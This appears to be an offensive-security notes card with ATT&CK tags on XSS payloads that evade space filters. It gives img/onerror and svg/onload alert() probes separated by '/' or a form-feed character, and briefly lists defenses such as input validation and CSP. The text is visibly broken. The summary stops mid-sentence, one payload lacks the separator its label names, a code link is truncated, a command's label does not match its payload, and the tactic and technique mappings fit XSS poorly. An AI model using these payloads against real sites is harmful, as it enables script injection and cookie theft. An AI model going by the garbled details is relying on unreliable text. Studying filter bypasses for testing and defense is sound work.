---
id: cc122ec8-c17c-4eab-a786-3cb19c349138
name: Exotic Payloads for Bypassing Space Filter
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:42.605251+00:00'
updated_at: '2023-04-10T20:21:49.208510+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]'
- '[[Valid Accounts|T1078 - Valid Accounts]]'
tags:
- '[[Bypass space filter]]'
- '[[Cross Site Scripting]]'
- '[[Filter Bypass and exotic payloads]]'
commands:
- '[[Bypass space filter with /]]'
- '[[Bypass space filter with 0x0c/^L]]'
- '[[Convert string to hex]]'
---

# Exotic Payloads for Bypassing Space Filter

## Summary

Exotic payloads can be used to bypass space filters in Cross Site Scripting attacks. This technique uses the slash and carat L character to bypass the filter. By doing so, an attacker can inject malicious code into a web page and execute it on a victim's browser. This technique can be used to steal

## Description

# Description

Exotic payloads can be used to bypass space filters in Cross Site Scripting attacks. This technique uses the slash and carat L character to bypass the filter. By doing so, an attacker can inject malicious code into a web page and execute it on a victim's browser. This technique can be used to steal sensitive information, such as session cookies, and perform actions on behalf of the victim.

 

## Requirements

1. Access to a vulnerable web application

 

## Defense

1. Implement input validation and sanitization techniques to prevent the injection of malicious code

1. Use Content Security Policy (CSP) to restrict the sources of content that can be executed on a web page

1. Regularly update web application components and libraries to patch known vulnerabilities

 

## Objectives

1. Inject and execute malicious code on a victim's browser

1. Steal sensitive information

1. Perform actions on behalf of the victim

 

# Instructions

1. To bypass space filter with "/", use the following command:
<img/src='1'/onerror=alert(0)>

To bypass space filter with 0x0c/^L, use the following command:
<svgonload=alert(1)>

 



**Code**: [[// Bypass space filter with "/"
<img/src='1'/onerr]]



> The first command uses the onerror attribute to execute the alert function when the image fails to load. The forward slash is used to bypass any space filters that may be in place.

The second command uses the onload attribute to execute the alert function when the SVG loads. The carat L (^L) is used to represent the 0x0c character and bypass any space filters that may be in place.



**Command** ([[Bypass space filter with /]]):

```bash
<img/src='1'/onerror=alert(0)>
```





**Command** ([[Bypass space filter with 0x0c/^L]]):

```bash
<svgonload=alert(1)>
```





**Command** ([[Convert string to hex]]):

```bash
<svg^Lonload^L=^Lalert(1)^L>
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Initial Access|TA0001 - Initial Access]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]
- [[Valid Accounts|T1078 - Valid Accounts]]

## Commands Used

- [[Bypass space filter with /]]
- [[Bypass space filter with 0x0c/^L]]
- [[Convert string to hex]]

## Tags

- [[Bypass space filter]]
- [[Cross Site Scripting]]
- [[Filter Bypass and exotic payloads]]


